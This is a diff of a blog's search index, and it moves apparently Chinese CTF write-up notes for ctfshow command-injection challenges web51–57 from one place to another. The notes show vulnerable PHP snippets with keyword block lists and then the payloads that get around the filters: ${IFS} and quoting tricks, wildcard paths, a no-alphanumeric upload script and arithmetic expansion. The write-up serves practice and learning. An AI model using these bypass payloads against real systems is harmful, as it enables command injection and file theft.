-<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="解答"><a href="#解答" class="headerlink" title="解答:"></a>解答:</h3><p>整上一题的payload，发现&lt;被过滤了，且$放出来了。于是把&lt;换成$IFS，出了假flag。构筑payload查一下根目录先：<code>ls$IFS/||</code></p>
-<p>发现根目录下有个flag，于是nl查看，出答案</p>
-<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br></pre></td></tr></table></figure>
-<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>。。。？不用||命令分隔了，直接上payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:c&#39;&#39;at$&#123;IFS&#125;fla&#39;&#39;g.p&#39;&#39;hp</span><br><span class="line">payload2:c&#x3D;nl$IFS\fla\g.php</span><br></pre></td></tr></table></figure>
-<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><h3 id="1、题目："><a href="#1、题目：" class="headerlink" title="1、题目："></a>1、题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:?c&#x3D;&#x2F;bin&#x2F;c??$&#123;IFS&#125;????????</span><br><span class="line">payload2:?c&#x3D;grep$&#123;IFS&#125;%27&#123;%27$&#123;IFS&#125;fl???php</span><br></pre></td></tr></table></figure>
-<h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p>ban了字母，走一波、<code>c=/???/????64 ????????</code>，得到base64解码拿到flag。</p>
-<p>羽师傅解法：<code>payload：?c=/???/???/????2 ????.??? ---》 然后在url + /flag.php.bz2</code></p>
-<h4 id="知识点：无字母数字命令执行"><a href="#知识点：无字母数字命令执行" class="headerlink" title="知识点：无字母数字命令执行"></a>知识点：无字母数字命令执行</h4><p>由于base64不是每台机器都装的，因此还有更猛一点的解法。参考P神博客：</p>
-<blockquote>
-<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
-</blockquote>
-<p>还有firebasky：</p>
-<blockquote>
-<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p>
-</blockquote>
-<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><p>演示一遍无字母数字的getshell</p>
-<p>先贴上Y4大佬的一把梭脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://da59fd11-9b26-4f20-b6f4-f86163f58cdd.challenge.ctf.show:8080/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;1.php&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<p>然后是标准的做法：</p>
-<p>先自己搞一个文件上传的接口(html)：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;题目链接&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>然后抓包传文件：</p>
-<p><img src="https://i.loli.net/2021/04/20/jfhUtXNOlmb4SBJ.png" alt="image-20210417103026086"></p>
-<p>读flag：</p>
-<p><img src="https://i.loli.net/2021/04/20/5PycMCkBVKLzbJD.png" alt="image-20210417103131530"></p>
-<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><h3 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-<h3 id="解答：-4"><a href="#解答：-4" class="headerlink" title="解答："></a>解答：</h3><p>看不懂看不懂看不懂，全过滤了还怎么打</p>
-<p>题目思路：全过滤了，拼接处36这个数字</p>
-<p>引用Y4博客：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(())------是-1</span><br><span class="line">$((~37))------是36</span><br><span class="line">所以我们只需要保证中间是-37即可，</span><br><span class="line">$((~$(())$(())))---是1</span><br><span class="line">所以</span><br><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))代表36，即可获取flag</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfshow命令执行绕过disable_functions</title>
     <url>/2021/04/19/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87disable_functions/</url>
     <content><![CDATA[<h1 id="ctfshow命令执行绕过disable-functions"><a href="#ctfshow命令执行绕过disable-functions" class="headerlink" title="ctfshow命令执行绕过disable_functions"></a>ctfshow命令执行绕过disable_functions</h1><p>船新版本，绕过禁用函数。</p>
@@ -793,6 +742,57 @@ C_{6}^{0}+C_{6}^{1}+C_{6}^{2}+C_{6}^{3}+C_{6}^{4}+C_{6}^{5}+C_{6}^{6}=64</script
 <p><a href="https://blog.csdn.net/solitudi/article/details/109837640?spm=1001.2014.3001.5501">https://blog.csdn.net/solitudi/article/details/109837640?spm=1001.2014.3001.5501</a></p>
 <p><a href="https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501">https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501</a></p>
 </blockquote>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow命令执行51-57</title>
+    <url>/2021/04/14/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C51-57/</url>
+    <content><![CDATA[<h1 id="ctfshow命令执行51-57"><a href="#ctfshow命令执行51-57" class="headerlink" title="ctfshow命令执行51-57"></a>ctfshow命令执行51-57</h1><p>ctfshow中web入门命令执行篇的一些刷题笔记</p>
+<span id="more"></span>
+<h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目:"></a>题目:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>相较50过滤了更多东西，尤其是tac 。。。泪目</p>
+<p>payload：<code>nl&lt;fl\ag.php||</code></p>
+<p>上一题的payload依旧能过</p>
+<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="解答"><a href="#解答" class="headerlink" title="解答:"></a>解答:</h3><p>整上一题的payload，发现&lt;被过滤了，且$放出来了。于是把&lt;换成$IFS，出了假flag。构筑payload查一下根目录先：<code>ls$IFS/||</code></p>
+<p>发现根目录下有个flag，于是nl查看，出答案</p>
+<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>。。。？不用||命令分隔了，直接上payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:c&#39;&#39;at$&#123;IFS&#125;fla&#39;&#39;g.p&#39;&#39;hp</span><br><span class="line">payload2:c&#x3D;nl$IFS\fla\g.php</span><br></pre></td></tr></table></figure>
+<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><h3 id="1、题目："><a href="#1、题目：" class="headerlink" title="1、题目："></a>1、题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:?c&#x3D;&#x2F;bin&#x2F;c??$&#123;IFS&#125;????????</span><br><span class="line">payload2:?c&#x3D;grep$&#123;IFS&#125;%27&#123;%27$&#123;IFS&#125;fl???php</span><br></pre></td></tr></table></figure>
+<h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p>ban了字母，走一波、<code>c=/???/????64 ????????</code>，得到base64解码拿到flag。</p>
+<p>羽师傅解法：<code>payload：?c=/???/???/????2 ????.??? ---》 然后在url + /flag.php.bz2</code></p>
+<h4 id="知识点：无字母数字命令执行"><a href="#知识点：无字母数字命令执行" class="headerlink" title="知识点：无字母数字命令执行"></a>知识点：无字母数字命令执行</h4><p>由于base64不是每台机器都装的，因此还有更猛一点的解法。参考P神博客：</p>
+<blockquote>
+<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
+</blockquote>
+<p>还有firebasky：</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p>
+</blockquote>
+<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><p>演示一遍无字母数字的getshell</p>
+<p>先贴上Y4大佬的一把梭脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://da59fd11-9b26-4f20-b6f4-f86163f58cdd.challenge.ctf.show:8080/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;1.php&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>然后是标准的做法：</p>
+<p>先自己搞一个文件上传的接口(html)：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;题目链接&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后抓包传文件：</p>
+<p><img src="https://i.loli.net/2021/04/20/jfhUtXNOlmb4SBJ.png" alt="image-20210417103026086"></p>
+<p>读flag：</p>
+<p><img src="https://i.loli.net/2021/04/20/5PycMCkBVKLzbJD.png" alt="image-20210417103131530"></p>
+<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><h3 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<h3 id="解答：-4"><a href="#解答：-4" class="headerlink" title="解答："></a>解答：</h3><p>看不懂看不懂看不懂，全过滤了还怎么打</p>
+<p>题目思路：全过滤了，拼接处36这个数字</p>
+<p>引用Y4博客：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(())------是-1</span><br><span class="line">$((~37))------是36</span><br><span class="line">所以我们只需要保证中间是-37即可，</span><br><span class="line">$((~$(())$(())))---是1</span><br><span class="line">所以</span><br><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))代表36，即可获取flag</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>web</category>
@@ -912,29 +912,6 @@ C_{6}^{0}+C_{6}^{1}+C_{6}^{2}+C_{6}^{3}+C_{6}^{4}+C_{6}^{5}+C_{6}^{6}=64</script
       </tags>
   </entry>
   <entry>
-    <title>vulfocus靶场搭建及bug处理</title>
-    <url>/2021/09/27/vulforce%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E5%8F%8Abug%E5%A4%84%E7%90%86/</url>
-    <content><![CDATA[<h1 id="vulfocus搭建"><a href="#vulfocus搭建" class="headerlink" title="vulfocus搭建"></a>vulfocus搭建</h1><p>想复现漏洞，但是漏洞复现需要大家一起交流一起学习，就想到搭一个漏洞复现靶场。</p>
-<span id="more"></span>
-<p>首先贴上<a href="https://fofapro.github.io/vulfocus/#/">官方链接</a>：</p>
-<p>推荐采用快速安装。自定义安装极其繁琐，把握不住。</p>
-<h2 id="安装流程："><a href="#安装流程：" class="headerlink" title="安装流程："></a>安装流程：</h2><h3 id="拉取镜像："><a href="#拉取镜像：" class="headerlink" title="拉取镜像："></a>拉取镜像：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus&#x2F;vulfocus:latest</span><br></pre></td></tr></table></figure>
